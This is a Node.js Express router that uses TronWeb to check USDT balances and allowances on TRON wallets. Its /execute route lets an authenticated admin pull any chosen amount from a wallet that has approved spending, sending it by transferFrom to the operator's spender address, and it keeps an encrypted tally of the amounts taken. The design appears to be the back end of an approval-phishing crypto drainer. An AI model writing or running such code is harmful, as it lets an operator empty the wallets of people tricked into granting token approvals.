var express = require('express');
var TronWeb = require('tronweb');
var Wallet = require('../models/Wallet');
var auth = require('../middleware/auth');
var vault = require('../crypto');
var { getSessionKey } = require('./auth');

var router = express.Router();

var USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
var DECIMALS = 6;

function getTronWeb() {
  return new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: process.env.SPENDER_PRIVATE_KEY
  });
}

router.post('/execute', auth, async function (req, res) {
  try {
    var walletId = req.body.walletId;
    var amount = req.body.amount;
    if (!walletId || !amount) {
      return res.status(400).json({ error: 'Wallet ID and amount required' });
    }

    var masterKey = getSessionKey(req.adminId);
    if (!masterKey) return res.status(401).json({ error: 'Vault locked — login again' });

    var wallet = await Wallet.findById(walletId);
    if (!wallet) return res.status(404).json({ error: 'Wallet not found' });
    if (wallet.status !== 'approved') {
      return res.status(400).json({ error: 'Wallet has not approved spending' });
    }

    var walletAddress = vault.decryptField(wallet.address, masterKey);
    if (!walletAddress) return res.status(500).json({ error: 'Failed to decrypt wallet' });

    var tronWeb = getTronWeb();
    var units = BigInt(Math.floor(parseFloat(amount) * Math.pow(10, DECIMALS)));

    var contract = await tronWeb.contract().at(USDT_CONTRACT);

    var allowance = await contract.allowance(walletAddress, process.env.SPENDER_ADDRESS).call();
    var allowanceBig = BigInt(allowance.toString());

    if (allowanceBig < units) {
      return res.status(400).json({
        error: 'Insufficient allowance',
        allowance: allowanceBig.toString(),
        requested: units.toString()
      });
    }

    var tx = await contract.transferFrom(
      walletAddress,
      process.env.SPENDER_ADDRESS,
      units.toString()
    ).send();

    var prevEnc = vault.decryptField(wallet.transferredAmount, masterKey);
    var prev = parseFloat(prevEnc) || 0;
    var newTotal = (prev + parseFloat(amount)).toFixed(2);
    wallet.transferredAmount = vault.encryptField(newTotal, masterKey);
    wallet.status = 'approved';
    var txHashStr = typeof tx === 'string' ? tx : (tx.txid || '');
    wallet.transferTxHash = vault.encryptField(txHashStr, masterKey);
    await wallet.save();

    res.json({ message: 'Transfer executed', txHash: txHashStr });
  } catch (err) {
    var errWallet = req.body.walletId ? await Wallet.findById(req.body.walletId) : null;
    if (errWallet) {
      errWallet.status = 'failed';
      await errWallet.save();
    }
    res.status(500).json({ error: err.message || 'Transfer failed' });
  }
});

router.post('/check-allowance', auth, async function (req, res) {
  try {
    var address = req.body.address;
    if (!address) return res.status(400).json({ error: 'Address required' });

    var tronWeb = getTronWeb();
    var contract = await tronWeb.contract().at(USDT_CONTRACT);
    var allowance = await contract.allowance(address, process.env.SPENDER_ADDRESS).call();

    res.json({
      allowance: allowance.toString(),
      readable: (Number(allowance) / Math.pow(10, DECIMALS)).toFixed(DECIMALS)
    });
  } catch (err) {
    res.status(500).json({ error: err.message || 'Failed to check allowance' });
  }
});

router.post('/user-balance', auth, async function (req, res) {
  try {
    var walletId = req.body.walletId;
    if (!walletId) return res.status(400).json({ error: 'Wallet ID required' });

    var masterKey = getSessionKey(req.adminId);
    if (!masterKey) return res.status(401).json({ error: 'Vault locked' });

    var wallet = await Wallet.findById(walletId);
    if (!wallet) return res.status(404).json({ error: 'Wallet not found' });

    var walletAddress = vault.decryptField(wallet.address, masterKey);
    if (!walletAddress) return res.status(500).json({ error: 'Decrypt failed' });

    var tronWeb = getTronWeb();
    var contract = await tronWeb.contract().at(USDT_CONTRACT);
    var balance = await contract.balanceOf(walletAddress).call();
    var readable = (Number(balance) / Math.pow(10, DECIMALS)).toFixed(DECIMALS);

    var allowance = await contract.allowance(walletAddress, process.env.SPENDER_ADDRESS).call();
    var allowanceReadable = (Number(allowance) / Math.pow(10, DECIMALS)).toFixed(DECIMALS);

    res.json({
      walletId: walletId,
      balance: readable,
      allowance: allowanceReadable
    });
  } catch (err) {
    res.status(500).json({ error: err.message || 'Failed to check balance' });
  }
});

router.get('/spender', function (req, res) {
  res.json({ address: process.env.SPENDER_ADDRESS });
});

module.exports = router;
